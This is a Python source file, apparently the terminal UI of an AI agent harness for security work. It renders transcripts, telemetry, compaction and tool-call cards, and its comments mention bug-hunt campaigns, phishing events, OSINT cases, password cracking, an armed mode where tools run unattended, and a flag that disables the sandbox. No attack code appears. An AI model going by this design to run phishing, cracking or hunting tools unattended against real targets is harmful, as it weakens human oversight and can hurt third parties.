            permission_handler=self.request_permission,
            can_peer=self._in_pane,
            peer_inbox=self._drain_peer_inbox if self._in_pane else None,
        )
        # While a modal (permission gate) is up, the prompt must be disabled so
        # approval keystrokes like "y" don't leak into it.
        self._modal_depth = 0
        # Serialises permission modals. One modal can be up at a time, and the
        # disable/restore bookkeeping in request_permission is not re-entrant —
        # so with /team's parallel workers two gated calls could otherwise stack
        # modals and leave the prompt permanently disabled.
        self._perm_lock = asyncio.Lock()
        self.busy = False
        self._cancelled = False
        self._stream_buf = ""
        # The /zim-opencode hunt spinner. A UI-thread timer rather than a
        # worker callback: the worker blocks inside single socket calls for tens
        # of seconds, so an animation driven by its progress would freeze for
        # exactly the stretch the operator is waiting through.
        self._hunt_timer = None
        self._hunt_frame = 0
        # The model's in-flight reasoning, when the endpoint forwards it. Held
        # separately from `_stream_buf` because the two can both be non-empty
        # (a model reasons, answers, then reasons again after a tool result),
        # and because they commit to the transcript at different moments.
        self._reason_buf = ""
        # across successive 1s ticks — no separate timer, and no rate to report
        # while nothing is streaming.
        self._last_output_tokens = 0
        # The prompt size of the most recent API call. That — not the session
        # cumulative input total — is how full the context window actually is:
        # the cumulative figure counts every turn's prompt and grows forever.
        self._last_call_input = 0
        # The fast repaint timer for the compaction animation, or None when no
        # compaction is running. One timer for the whole app: started by the
        # `compacting` event, stopped when the panel closes itself.
        self._compact_timer = None
        # Team workers' usage, carried into the bar on top of the main agent's
        # own totals. _handle_event computes the bar from self.agent alone, so
        # without this the synthesis turn would overwrite the bar and drop the
        # workers' tokens and cost — the team's spend would vanish from view.
        self._team_tokens: tuple[int, int, float] = (0, 0, 0.0)
        # ---- /bug-hunt campaign state.
        # The stop flag is created once and reused, so /stop-hunt can set it
        # from the prompt while the hunt worker is mid-wave. _hunt_run is the
        # live campaign (None when idle); _hunt_summary_queued is what
        # /summary-hunt sets when it is asked for mid-run — the summary runs at
        # the next wave boundary, because two turns streaming through the same
        # transcript at once corrupts it.
        self._hunt_stop = asyncio.Event()
        self._hunt_run = None
        self._hunt_summary_queued = False
        #: The campaign directory of the last hunt *this session* started, kept
        #: after `_hunt_run` is cleared at the end of the wave. `/summary-hunt`
        #: and `/findings` prefer it over the newest-directory heuristic: the
        #: operator asking for a report one line after a wave finished means
        #: *that* wave, and on a machine with more than one campaign the
        #: heuristic is a guess. Only a real `/ad` or `/bug-hunt` in this session
        #: sets it, so it cannot point at a directory the operator did not just
        #: run.
        self._hunt_dir: Path | None = None
        #: The target of the campaign in flight, kept past the run object's
        #: clearing so the closing notice can name it.
        self._hunt_target = ""
        self._hunt_tokens: tuple[int, int, float] = (0, 0, 0.0)
        #: The findings window, while it is open. Held so `/findings` toggles it
        #: and so the hunt worker can push each new finding into it live.
        self._findings_panel: FindingsPanel | None = None
        # `/phish` events arrive on the HTTP thread. The queue is the only
        # crossing: the 0.25s rail tick drains it onto ZimPane on the UI
        # thread. A lock is enough — these are tiny dicts, not renderables.
        self._phish_events: list[dict] = []
        self._phish_q_lock = threading.Lock()

    # ---- compose ----------------------------------------------------------
    def compose(self) -> ComposeResult:
        # The matrix rain is painted *inside* the transcript pane (see
        # RainRichLog) — Textual's compositor does not blend widgets across
        # layers, so a widget on a lower layer would be hidden by the panes.
        # The rails are deliberately crisp: no rain, so the numbers stay legible.
        yield HeaderBar(self.palette, self.cfg.display_model, str(self.cfg.workdir),
                        self.cfg.unsafe, self.theme_name, mode=self.cfg.mode)
        with Horizontal(id="main"):
            yield LoopRail(self.palette)
            yield ChatPane(self.palette, rain=self.rain_on)
            yield ZimPane(self.palette)
            yield TelemetryRail(self.palette, total_context=self.cfg.context_window)
        with Vertical(id="bottom-dock"):
            popup = CompletionPopup(self.palette, id="complete")
            popup.base_url = self.cfg.base_url
            yield popup
            yield StatusBar(self.palette)
            yield PromptInput(placeholder="❯ message ZimZilla…   ( / commands · @ files · ^K palette )",
                              id="input")

    def on_mount(self) -> None:
        self.title = "ZIMZILLA"
        try:
            theme = self.palette.rich_theme()
            self.register_theme(theme)
            self.theme = theme.name
        except Exception:
            pass

        self.push_screen(
            BootScreen(self.palette, self._boot_checks(), self._boot_done, rain=self.cfg.boot_rain)
        )

    def _copy_selection(self, text: str) -> None:
        """Put *text* on the clipboard. Never fatal — a headless or
        OSC-52-less terminal just keeps the in-app clipboard."""
        text = (text or "").rstrip("\n")
        if not text.strip():
            return
        try:
            self.copy_to_clipboard(text)
        except Exception:
            return
        try:
            bar = self.query_one(StatusBar)
            n = len(text)
            bar.set_activity(f"copied {n} char{'s' if n != 1 else ''}", busy=False)
            bar.render_bar()
        except Exception:
            pass

    def on_text_selected(self, event: TextSelected) -> None:
        """Mouse-up after a drag across the transcript, rails, or zim-pane."""
        try:
            text = self.screen.get_selected_text()
        except Exception:
            text = None
        if text:
            self._copy_selection(text)

    def on_mouse_up(self, event: MouseUp) -> None:
        """Input has its own selection and does not emit TextSelected.

        Copy whatever is highlighted in the focused input when the mouse
        is released, so the prompt field behaves like the rest of the UI.
        """
        focused = self.focused
        if not isinstance(focused, Input):
            return
        selected = getattr(focused, "selected_text", "") or ""
        if selected:
            self._copy_selection(selected)

    def _boot_checks(self) -> list[tuple[str, str, bool]]:
        cfg = self.cfg
        checks: list[tuple[str, str, bool]] = [
            ("API KEY", "present" if cfg.api_key_present else "MISSING", cfg.api_key_present),
            ("ENDPOINT", cfg.redacted_endpoint(), True),
            ("MODEL", cfg.display_model, True),
            ("CWD", str(cfg.workdir), True),
        ]
        scope = self.agent.scope
        if scope.armed:
            checks.append((
                "ALLOW.YAML",
                f"{scope.allow.describe()} — session ARMED, tools run unattended",
                True,
            ))
        else:
            checks.append(("ALLOW.YAML", "not loaded — session not armed", True))
        if scope.deny_path is not None:
            checks.append(("OUT-OF-SCOPE", f"{scope.deny.describe()} — blocked", True))
        else:
            checks.append(("OUT-OF-SCOPE", "not loaded — nothing blocked", True))
        # A stale scope.yaml is the one genuinely alarming state: the operator
        # may believe a guard is armed when nothing at all is loaded.
        if cfg.legacy_scope_path is not None:
            checks.append((
                "SCOPE.YAML",
                f"{cfg.legacy_scope_path} ignored — split into allow.yaml / "
                "out-of-scope.yaml; nothing is armed",
                False,
            ))
        checks.append(("SANDBOX", "DISABLED (--unsafe)" if cfg.unsafe else "enabled", not cfg.unsafe))
        checks.append((
            "TOOLS",
            f"{len(tools_mod.TOOL_SCHEMAS)} registered "
            "(bash, io, search, web)",
            True,
        ))
        return checks

    def _boot_done(self, typed: list[str] | None = None, submit: bool = False) -> None:
        self.pop_screen()
        # Apply the palette now, not just on /theme — otherwise the input
        # border and scrollbars keep the default green under --theme amber/cyan.
        self._apply_palette()
        # Seed the status bar so it reflects the configured model from the start.
        bar = self.query_one(StatusBar)
        bar.model = self.cfg.display_model
        bar.render_bar()
        self.query_one(HeaderBar).set_scope(
            self.agent.scope.badge(),
            self.agent.scope.armed,
        )
        self._splash()
        # A session relaunched by `/panes` arrives with its conversation already
        # in `agent.messages` and an empty transcript pane — `/load` restores the
        # history but nothing repaints it. Replaying it here is what makes
        # "your session continues there" true rather than a claim the operator
        # has to take on faith.
        self._replay_transcript()
        # The split is a deliberate weakening on upgrade, so it is said out
        # loud in the transcript too — not just the boot checks, which scroll
        # away the moment the first prompt is typed.
        if self.cfg.legacy_scope_path is not None:
            self._sys_line(
                f"{self.cfg.legacy_scope_path} is ignored — the scope guard was "
                "split into allow.yaml (declared targets, arms the session) and "
                "out-of-scope.yaml (never touch). Nothing is armed or blocked.",
                warn=True,
            )
        # Fold any campaigns left in the old `<scope>-<stamp>` layout into one
        # directory per scope. Done at boot, before anything can read the hunts
        # store, so `/summary-hunt` and `/findings` see the merged layout from
        # the first command. Idempotent, and cheap: it walks a directory of
        # directories and moves files only when the old layout is still there.
        try:
            merged = hunt_mod.migrate_hunts(self.cfg)
        except Exception:  # noqa: BLE001
            merged = []
        if merged:
            self._sys_line(
                f"merged {len(merged)} old hunt campaign(s) into one directory "
                f"per scope under {Path(self.cfg.state_dir) / 'hunts'}", ok=True)
        # Then file each campaign's flat `findings/` and `plans/` into the
        # per-wave directories. Runs after the merge, because a legacy campaign
        # has to be inside its scope before it can be reorganised. Also
        # idempotent: a second boot finds no flat directories and does nothing.
        try:
            refiled = hunt_mod.reorganise_waves(self.cfg)
        except Exception:  # noqa: BLE001
            refiled = []
        if refiled:
            self._sys_line(
                f"filed {len(refiled)} hunt artefact(s) into per-wave "
                "directories", ok=True)
        inp = self.query_one("#input", Input)
        # Warm the Logfare catalog while the operator reads the banner, so the
        # first /model is current instead of showing the declared fallback. Only
        # for the local proxy: on a hosted source this would be a pointless
        # round-trip to a status API that has nothing to do with the session.
        if sources_mod.active_key(self.cfg.base_url) == "logfare":
            self._warm_logfare_catalog()
        # Same reason, for the other local proxy with a public catalog: its
        # model ids are `provider/model`, none of which appear in the declared
        # fallback beyond the free one, so a cold cache would offer a one-entry
        # list until the operator happened to run /iteracompute-models.
        elif sources_mod.active_key(self.cfg.base_url) == "iteracompute":
            self._warm_iteracompute_catalog()
        # And again for InfronAI, for the same reason: every id it serves is
        # `provider/model`, and the declared fallback is a snapshot of a free
        # lineup that changes over time.
        elif sources_mod.active_key(self.cfg.base_url) == "infronai":
            self._warm_infronai_catalog()
        # And again for NVIDIA. Its catalog is public and every id is
        # `provider/model`, so a cold cache would offer the five measured ids
        # instead of the ~57 chat entries the endpoint actually lists.
        elif sources_mod.active_key(self.cfg.base_url) == "nvidia":
            self._warm_nvidia_catalog()
        # Replay anything the user typed while the boot animation was running.
        text = "".join(typed or [])
        inp.focus()
        self.set_interval(1.0, self._tick_status)
        self.set_interval(0.55, self._flash_cursor)
        self.set_interval(0.25, self._tick_rails)
        self._sync_rails()
        if text and submit:
            # Enter arrived during boot: deliver the whole buffered line now.
            self.call_after_refresh(self._submit_text, text)
        elif text:
            inp.value = text
            inp.cursor_position = len(inp.value)

    def _replay_transcript(self) -> None:
        """Redraw a restored conversation in the transcript pane.

        Only fires when the agent already holds history at boot — which is the
        `/panes` relaunch, since a normal launch starts empty. The renderers are
        the same ones a live turn uses, so a replayed answer looks like the
        answer did.
        """
        from .. import panes as _panes

        pairs = _panes.transcript_of(self.agent.messages)
        if not pairs:
            return
        p = self.palette
        chat = self.query_one(ChatPane)
        chat.write_block(
            R.warning_block(
                f"resumed — {len(pairs)} message(s) from before the relaunch",
                p,
            )
        )
        for role, text in pairs:
            if role == "user":
                chat.write_block(R.user_prompt_block(text, p))
            else:
                chat.write_block(markdown_renderable(text, p))

    def _submit_text(self, text: str) -> None:
        text = text.strip()
        if not text:
            return
        if text.startswith("/"):
            self._handle_command(text)
        else:
            self._run_turn(self._expand_at_refs(text))

    def _expand_at_refs(self, text: str) -> str:
        """Turn ``@path`` mentions into an attached-files block for the model.

        The visible prompt keeps the short form; the model receives the file
        contents inline so a mention is immediately actionable.
        """
        import re

        from ..sandbox import SandboxError, resolve_in_jail

        tokens = re.findall(r"(?<!\w)@([^\s@]+)", text)
        if not tokens:
            return text
        attached: list[str] = []
        for tok in dict.fromkeys(tokens):  # de-dupe, keep order
            raw = tok.rstrip(".,;:)")
            try:
                path = resolve_in_jail(self.cfg.workdir, raw, self.cfg.unsafe, must_exist=True)
            except SandboxError:
                continue
            if path.is_dir():
                try:
                    listing = "\n".join(
                        sorted(p.name + ("/" if p.is_dir() else "") for p in path.iterdir())
                    )
                except Exception:
                    listing = "(unreadable)"
                attached.append(f"--- {raw}/ (directory) ---\n{listing}")
                continue
            try:
                body = path.read_text(errors="replace")
            except Exception:
                continue
            limit = self.cfg.max_output_chars
            if len(body) > limit:
                body = body[:limit] + f"\n... [truncated at {limit} chars] ..."
            attached.append(f"--- {raw} ---\n{body}")
        if not attached:
            return text
        return text + "\n\n[referenced files]\n" + "\n\n".join(attached)

    def _splash(self) -> None:
        """The banner, centred, at whatever width the transcript has now.

        Written as one renderable and centred by ``Align`` rather than padded
        into place by hand. The transcript reflows every block it holds when a
        rail is dragged (see ``RainRichLog._reflow``), so a banner centred in
        the string would be correct at launch and off-centre from the first
        resize onward; an ``Align`` re-centres on every re-render because the
        renderable is kept, not the rendered lines.
        """
        from rich.align import Align
        from .banner import splash_mark

        mark = splash_mark(self.palette, model=self.cfg.display_model,
                           base_url=self.cfg.base_url)
        self.query_one(ChatPane).write_block(Align.center(mark))

    # ---- timers -----------------------------------------------------------
    def _status_bar(self) -> StatusBar | None:
        try:
            return self.query_one(StatusBar)
        except Exception:
            # Interval timers can fire while a screen is being swapped or the
            # app is tearing down; a missing bar is never fatal.
            return None

    def _tick_status(self) -> None:
        bar = self._status_bar()
        if bar is not None:
            bar.render_bar()
        self._sample_throughput()

    def _sample_throughput(self) -> None:
        """Feed the waveform a tokens-per-second sample from the token delta.

        Sampled on the existing 1s status tick rather than a timer of its own:
        the delta over one second *is* the rate, so a second timer would only
        measure the same thing more often.
        """
        now = self.agent.session_output_tokens
        delta = max(0, now - self._last_output_tokens)
        self._last_output_tokens = now
        if not self.busy:
            return
        try:
            self.query_one(TelemetryRail).push_wave(float(delta))
        except Exception:
            pass

    # ---- rails ------------------------------------------------------------
    def _tick_rails(self) -> None:
        """0.25s heartbeat: the loop node breathes, the live card's clock runs."""
        try:
            self.query_one(LoopRail).tick_pulse()
        except Exception:
            return
        try:
            self.query_one(ChatPane).card_tick()
        except Exception:
            pass
        self._drain_phish()

    def _sync_rails(self) -> None:
        """Push the agent's session totals into the rails.

        Called at boot and after every turn — anywhere the numbers change
        without an event to carry them.
        """
        try:
            rail = self.query_one(TelemetryRail)
            loop = self.query_one(LoopRail)
        except Exception:
            return
        a = self.agent
        rail.set_cost(a.session_cost, a.session_input_tokens, a.session_output_tokens)
        window = a.context_window()
        rail.set_context(self._last_call_input, window, a.compact_threshold(window))
        loop.set_counters(a.turn_count, self.query_one(StatusBar).iterations)

    def on_resize(self, event) -> None:
        """Drop the rails on a narrow terminal rather than squeezing the chat."""
        screen = self.screen
        if screen is None:
            return
        if event.size.width < 100:
            screen.add_class("narrow")
        else:
            screen.remove_class("narrow")

    def _flash_cursor(self) -> None:
        if not self.busy:
            return
        try:
            chat = self.query_one(ChatPane)
        except Exception:
            return
        chat.flash_cursor()
        if self._stream_buf:
            chat.set_stream(self._stream_buf)
        if self._reason_buf:
            chat.set_reasoning(self._reason_buf)

    async def _verb_spinner(self) -> None:
        bar = self._status_bar()
        i = 0
        while self.busy:
            if bar is not None and not bar.hold:
                bar.activity = THINKING_VERBS[i % len(THINKING_VERBS)]
                bar.render_bar()
            i += 1
            await asyncio.sleep(0.35)

    # ---- compaction animation ---------------------------------------------
    #: Frames per second for the compaction panel and the rail sweep. 0.09s is
    #: fast enough to read as motion (11fps of a 4-row cascade) and slow enough
    #: that repainting two widgets cannot cost a frame of the stream.
    COMPACT_TICK = 0.09

    def _start_compact_animation(self) -> None:
        """Start the fast repaint loop for a compaction, if it is not running."""
        if getattr(self, "_compact_timer", None) is not None:
            return
        self._compact_timer = self.set_interval(
            self.COMPACT_TICK, self._compact_frame_tick)

    def _stop_compact_animation(self) -> None:
        timer = getattr(self, "_compact_timer", None)
        if timer is not None:
            try:
                timer.stop()
            except Exception:  # noqa: BLE001 - a stopped timer is already fine
                pass
        self._compact_timer = None

    def _compact_frame_tick(self) -> None:
        """One frame of the compaction animation: panel, rail sweep, status."""
        try:
            chat = self.query_one(ChatPane)
        except Exception:  # noqa: BLE001 - shutting down
            self._stop_compact_animation()
            return
        alive = chat.compact_tick()
        tele = self._telemetry_rail()
        if tele is not None:
            tele.tick_context()
        bar = self._status_bar()
        if bar is not None:
            bar.tick_compaction()
        if not alive:
            # The panel has closed (or never opened): nothing left to paint, so
            # the timer stops itself rather than spinning for the session.
            self._stop_compact_animation()

    # ---- input ------------------------------------------------------------
    def _completer(self) -> CompletionPopup:
        return self.query_one("#complete", CompletionPopup)

    def _visible_completions(self) -> bool:
        try:
            return self._completer().has_class("visible")
        except Exception:
            return False

    @on(Input.Changed, "#input")
    def _on_input_changed(self, event: Input.Changed) -> None:
        try:
            # The caret, not the end of the line: a mention edited mid-prompt
            # has to be the one the popup is describing.
            self._completer().refresh_for(
                event.value, self.cfg.workdir, event.input.cursor_position)
        except Exception:
            pass

    def on_key(self, event) -> None:
        """Route completion keys before the Input sees them."""
        if not self._visible_completions():
            return
        comp = self._completer()
        key = event.key
        if key == "down":
            comp.move(1)
            event.stop(); event.prevent_default()
        elif key == "up":
            comp.move(-1)
            event.stop(); event.prevent_default()
        elif key in ("tab", "enter", "return"):
            inp = self.query_one("#input", Input)
            new = comp.accept(inp.value, inp.cursor_position)
            if new is not None:
                inp.value = new
                inp.cursor_position = len(new)
            comp.remove_class("visible")
            if key == "tab":
                event.stop(); event.prevent_default()
            # Enter with no completion left should submit, so let it through.
        elif key == "escape":
            comp.remove_class("visible")
            event.stop(); event.prevent_default()

    @on(Input.Submitted, "#input")
    def _on_submit(self, event: Input.Submitted) -> None:
        text = event.value.strip()
        self.query_one("#input", Input).value = ""
        self._completer().remove_class("visible")
        if not text:
            return
        # A slash command is dispatched *before* the busy check, because some
        # commands have to work while a run is in flight — `/stop-hunt` and
        # `/summary-hunt` are useless otherwise, and a hunt that cannot be
        # stopped from the prompt is a hunt you can only kill with Ctrl+C.
        # _handle_command decides which commands those are; everything else
        # still refuses when busy.
        if text.startswith("/"):
            self._handle_command(text)
            return
        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return
        self._run_turn(self._expand_at_refs(text))

    # ---- turn worker ------------------------------------------------------
    @work(exclusive=True)
    async def _run_turn(
        self,
        text: str,
        display: str | None = None,
        osint_case: Path | None = None,
        finalise: "Callable[[], None] | None" = None,
        deliverable: "Deliverable | None" = None,
    ) -> None:
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)

        self.busy = True
        self._cancelled = False
        self._stream_buf = ""
        self._reason_buf = ""
        self._set_rain(False)  # keep the transcript readable during a turn

        loop = self._loop_rail()
        if loop is not None:
            # A previous turn's cap must not carry into this one, or the rail
            # would say CAPPED while the new turn is running fine.
            loop.clear_cap()
            loop.set_stage("thinking")
            loop.set_counters(self.agent.turn_count + 1, 0)

        # The spine joint that opens the turn, then the prompt it belongs to.
        # `display` lets a caller show a short label for a long synthetic prompt
        # (/osint's playbook is thousands of words) while the agent still
        # receives the full text — the transcript shows what the operator
        # typed, not the briefing behind it.
        chat.write_block(R.turn_marker(self.agent.turn_count + 1, p))
        chat.write_block(R.user_prompt_block(display or text, p))
        bar.set_activity("thinking", busy=True)
        spinner = asyncio.create_task(self._verb_spinner())

        try:
            async for ev in self.agent.run_turn(text, deliverable=deliverable):
                if self._cancelled:
                    break
                await self._handle_event(ev)
        except asyncio.CancelledError:
            raise
        except Exception as e:  # noqa: BLE001
            chat.write_block(R.error_block(f"{type(e).__name__}: {e}", p))
        finally:
            self.busy = False
            spinner.cancel()
            chat.clear_stream()
            # Before card_finish and the buffer reset: a turn can end on
            # reasoning that never got an answer after it — an interrupted
            # turn, or a model that thought and then stopped. Committing here
            # is what keeps that thinking rather than dropping it silently
            # when the slot is torn down.
            self._flush_reasoning(chat, p)
            chat.card_finish()
            self._stream_buf = ""
            bar.set_activity("idle", busy=False)
            bar.input_tokens = self.agent.session_input_tokens
            bar.output_tokens = self.agent.session_output_tokens
            bar.cost = self.agent.session_cost
            bar.turns = self.agent.turn_count
            bar.model = self.cfg.display_model
            bar.render_bar()
            loop = self._loop_rail()
            if loop is not None:
                loop.set_stage("idle")
                loop.set_counters(self.agent.turn_count, bar.iterations)
            self._sync_rails()
            self._set_rain(self.rain_on)
            if self._cancelled:
                self.agent.cancel_turn()
                self._sys_line("turn interrupted", warn=True)
            # An osint run leaves its whole case directory behind — clones,
            # raw API dumps, avatars. Once the report is written, archive it
            # and delete the rest, so ~/.zimzilla does not grow without bound.
            # Runs in the finally block, so an interrupted run is tidied too.
            # finalise_case deletes NOTHING unless it found a report, so a run
            # that failed or was cut short keeps its evidence for inspection.
            #
            # `finalise` is the general form of the same hook: a command whose
            # run leaves state behind hands its own tidy-up callable here rather
            # than each getting its own parameter. `/crack` archives its report
            # but keeps its case (the potfile is worth keeping), which is a
            # different policy from osint's — so the policy lives in the
            # callable, and this block stays ignorant of it.
            if finalise is not None:
                finalise()
            elif osint_case is not None:
                self._finalise_osint(osint_case)
            self.query_one("#input", Input).focus()

    async def _handle_event(self, ev: dict) -> None:
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)
        loop = self._loop_rail()
        tele = self._telemetry_rail()
        etype = ev["type"]

        if etype == "thinking":
            bar.iterations = ev["iteration"] + 1
            bar.turns = self.agent.turn_count
            bar.set_activity("thinking", busy=True)
            if loop is not None:
                loop.set_stage("thinking")
                loop.set_counters(self.agent.turn_count, bar.iterations)

        elif etype == "reasoning_delta":
            # The model's own thinking, streamed before it answers. Only some
            # endpoints send this — see `_stream_once` in agent.py for which,
            # and why an endpoint that drops it changes nothing here.
            self._reason_buf += ev["text"]
            if self.cfg.show_thinking:
                chat.set_reasoning(self._reason_buf)

        elif etype == "text_delta":
            # The first character of the answer means the thinking that
            # produced it is finished, so commit it now. Doing it here rather
            # than at turn_end is what keeps the transcript in the order the
            # two actually arrived in, and stops the live slot being cleared
            # out from under a half-read block when the answer takes over.
            if not self._stream_buf and self._reason_buf:
                self._flush_reasoning(chat, p)
            self._stream_buf += ev["text"]
            chat.set_stream(self._stream_buf)

        elif etype == "retry":
            self._flush_stream(chat, p)
            self._sys_line(
                f"transport error ({ev['reason']}) — retry {ev['attempt']}/{ev['max']} "
                f"in {ev['delay']:.1f}s",
                warn=True,
            )
            bar.set_activity(f"retry {ev['attempt']}/{ev['max']}", busy=True)

        elif etype == "param_dropped":
            # The model refused a sampling knob the harness sent; it is dropped
            # and the request retried. Worth one dim line — otherwise the
            # session silently stops honouring a setting the operator chose,
            # and the next turn looks like it ignored them.
            self._flush_stream(chat, p)
            self._sys_line(
                f"this model does not accept `{ev['param']}` — dropped for this "
                f"session and retrying",
                warn=True,
            )

        elif etype == "usage":
            # The agent has not yet folded this turn's usage into its session
            # totals, so add it here for a live running figure. Any team
            # workers' usage rides on top — they spent against the same session
            # and dropping them here would make the total jump backwards when
            # the synthesis turn starts.
            team_in, team_out, team_cost = self._team_tokens
            bar.input_tokens = self.agent.session_input_tokens + team_in + ev["input"]
            bar.output_tokens = self.agent.session_output_tokens + team_out + ev["output"]
            bar.cost = self.agent.session_cost + team_cost + ev["cost"]
            bar.render_bar()
            # ev["input"] is this one call's prompt size — the closest thing to
            # a live context reading available.
            self._last_call_input = ev["input"]
            if tele is not None:
                # The window is passed alongside so the gauge's percentage is a
                # share of *this model's* window, not of the configured
                # fallback — resolved the same way the auto-compact threshold
                # resolves it, so the two can never disagree. The threshold is
                # that same resolution, drawn as a marker on the bar.
                window = self.agent.context_window()
                tele.set_context(self._last_call_input, window,
                                 self.agent.compact_threshold(window))

        elif etype == "tool_call":
            self._flush_stream(chat, p)
            args = ev["args"] or {}
            # The live card: one slot, transitioning requested → running. It is
            # only *visible* for a slow tool — an instant read finishes before
            # the next paint, which is the correct behaviour, not a bug.
            chat.card_finish()
            chat.card_begin(ev["name"], args, self._targets_for(ev["name"], args))
            if tele is not None:
                tele.touch_file(self._file_for(ev["name"], args))
                tele.note_call(ev["name"])
            if loop is not None:
                loop.set_stage("calling")
            if ev.get("gated"):
                bar.set_activity(f"awaiting permission: {ev['name']}", busy=True)

        elif etype == "tool_result":
            args = ev.get("args") or {}
            diff = ev.get("diff")
            chat.card_finish()
            if diff and not ev["is_error"] and diff.strip() != "(no textual change)":
                verb = "WRITE" if ev["name"] == "write_file" else "EDIT"
                chat.write_block(R.diff_panel(args.get("path", "?"), diff, p, verb))
            else:
                chat.write_block(
                    R.tool_result_panel(ev["name"], args, ev["output"], p,
                                        ev["is_error"], ev.get("meta"))
                )
            if tele is not None:
                tele.note_result(ev["name"], not ev["is_error"])
            if loop is not None:
                loop.set_stage("observing")

        elif etype == "blocked":
            chat.card_finish()
            chat.write_block(R.blocked_block(ev["targets"], p))
            if tele is not None:
                tele.note_result(ev.get("name", "bash"), False)
            if loop is not None:
                loop.set_stage("observing")

        elif etype == "error":
            self._flush_stream(chat, p)
            chat.card_finish()
            chat.write_block(R.error_block(ev["message"], p))

        elif etype == "continuing":
            # The soft round cap was passed because the turn is still getting
            # work done. Said out loud so a long turn is legible rather than
            # looking stuck — and so the count is visible when it does stop.
            self._flush_stream(chat, p)
            self._sys_line(
                f"{ev['rounds']} rounds and still progressing — continuing "
                f"({ev['continued']} past the {ev['limit']}-round cap)",
                ok=True,
            )

        elif etype == "iteration_cap":
            # The turn stopped at a round cap. This is the event whose absence
            # was the bug: the loop used to fall out of `for range()` and yield
            # a plain turn_end, so a capped turn and a finished one looked
            # identical and the rail went IDLE with the task unfinished.
            self._flush_stream(chat, p)
            chat.card_finish()
            if ev.get("hard"):
                self._sys_line(
                    f"stopped at the hard limit of {ev['limit']} rounds — this "
                    "is a runaway guard, so the turn was probably looping "
                    "without progressing. Send another message to carry on.",
                    warn=True,
                )
            else:
                self._sys_line(
                    f"stopped at {ev['limit']} rounds with no progress in the "
                    "last one — the task may be unfinished. Send another "
                    "message to carry on from here.",
                    warn=True,
                )
            if loop is not None:
                loop.set_capped(ev["rounds"], ev["limit"], bool(ev.get("hard")))

        elif etype == "compacting":
            self._flush_stream(chat, p)
            chat.card_finish()
            where = "the prompt overflowed" if ev.get("trigger") == "overflow" \
                else "context is nearly full"
            self._sys_line(
                f"{where} — compacting history automatically "
                f"({ev['used']:,} / {ev['window']:,} tokens)",
                warn=True,
            )
            # The animation owns the screen for the duration of the summariser
            # request, which is a single call with no output of its own. It is
            # fed the same numbers the loop used, so what it draws is the real
            # compaction rather than a decorative spinner.
            chat.compact_begin(
                used=ev.get("used") or 0,
                window=ev.get("window") or 0,
                threshold=ev.get("threshold") or self.agent.compact_threshold(
                    ev.get("window") or 0),
                trigger=str(ev.get("trigger") or "threshold"),
            )
            if tele is not None:
                tele.set_compacting(True)
            self._start_compact_animation()
            bar.set_activity("compacting context", busy=True, hold=True)

        elif etype == "compacted":
            chat.compact_end(bool(ev["ok"]), str(ev.get("note") or ""),
                             used=ev.get("used"), after=ev.get("after"))
            if tele is not None:
                tele.set_compacting(False)
            bar.set_activity("thinking", busy=True)
            if ev["ok"]:
                self._sys_line(
                    "history compacted — carrying on with a summary of it",
                    ok=True,
                )
                # The prompt is now a summary, so the live gauge reading is
                # stale by design; drop it to zero rather than leave the old,
                # much larger number on screen as though nothing happened.
                self._last_call_input = 0
                if tele is not None:
                    tele.set_context(0)
            else:
                self._sys_line(f"auto-compact failed: {ev['note']}", warn=True)

        elif etype == "reasoning_exhausted":
            # A truncation that carried nothing. The reply hit the ceiling and
            # came back empty, which is what a reasoning model looks like through
            # a proxy that does not forward its thinking: the whole budget went
            # to reasoning the harness never receives, so there is no text and no
            # tool call to show. Named separately from `truncated` because the
            # advice differs — nothing the model asked for was dropped, so
            # "the requested action may not have run" would be a lie, and the
            # fix is more room rather than a re-run.
            self._flush_stream(chat, p)
            chat.card_finish()
            if ev.get("retry_tokens"):
                self._sys_line(
                    f"empty reply at {ev['max_tokens']:,} output tokens — the "
                    "model spent the whole budget on reasoning this endpoint "
                    f"does not forward; retrying with {ev['retry_tokens']:,}",
                    warn=True,
                )
                bar.set_activity("thinking", busy=True)
            else:
                self._sys_line(
                    f"empty reply at {ev['max_tokens']:,} output tokens — the "
                    "model spent the whole budget on reasoning this endpoint "
                    "does not forward, and the raised retry hit the same wall. "
                    "Ask again, or narrow the request.",
                    warn=True,
                )

        elif etype == "truncated":
            # The reply hit the output ceiling and was cut off. Said out loud
            # because the SDK drops a truncated tool call, so a `Write` that ran
            # into the ceiling leaves a transcript that looks exactly like one
            # where the model simply stopped — which is how an osint run ended
            # with "Writing the report." and no report.
            self._flush_stream(chat, p)
            self._sys_line(
                f"reply truncated at {ev['max_tokens']} output tokens — the "
                "requested action may not have run (raise it with --max-tokens)",
                warn=True,
            )

        elif etype == "nudged":
            self._flush_stream(chat, p)
            self._sys_line(
                f"{ev['label']} was not written — asking again "
                f"({ev['attempt']})",
                warn=True,
            )

        elif etype == "deliverable":
            # The end-of-turn verdict on the file the turn was supposed to
            # leave behind. Read off the disk in agent.py, so this states a
            # fact rather than inferring one from the transcript.
            self._flush_stream(chat, p)
            if ev["written"]:
                self._sys_line(f"{ev['label']} written: {ev['path']}", ok=True)
            else:
                self._sys_line(
                    f"{ev['label']} was never written — the turn ended without "
                    f"it (expected at {ev['path']})",
                    warn=True,
                )

        elif etype == "turn_end":
            self._flush_stream(chat, p)
            chat.card_finish()
            self._cost_line(ev)
            if tele is not None:
                tele.set_cost(ev["cost"] + self.agent.session_cost, bar.input_tokens,
                              bar.output_tokens)
            if loop is not None:
                loop.set_stage("idle")

    # ---- rails helpers ----------------------------------------------------
    def _loop_rail(self) -> LoopRail | None:
        try:
            return self.query_one(LoopRail)
        except Exception:
            return None

    def _telemetry_rail(self) -> TelemetryRail | None:
        try:
            return self.query_one(TelemetryRail)
        except Exception:
            return None

    def _file_for(self, name: str, args: dict) -> str:
        """The path a tool acts on, for the file river. Empty when there is none."""
        if name in {"read_file", "write_file", "edit_file", "list_dir"}:
            return str(args.get("path", "") or "")
        if name in {"glob", "grep"}:
            return str(args.get("path", "") or "")
        return ""

    def _targets_for(self, name: str, args: dict) -> list[str]:
        """Hosts a bash command names — shown on the card, never enforced here.

        Reuses the scope guard's extractor, so the card shows exactly what the
        deny-list would have looked at.
        """
        if name != "bash":
            return []
        command = args.get("command", "")
        if not command:
            return []
        try:
            return _dedupe(self.agent.scope.extract_targets(command))[:4]
        except Exception:
            return []

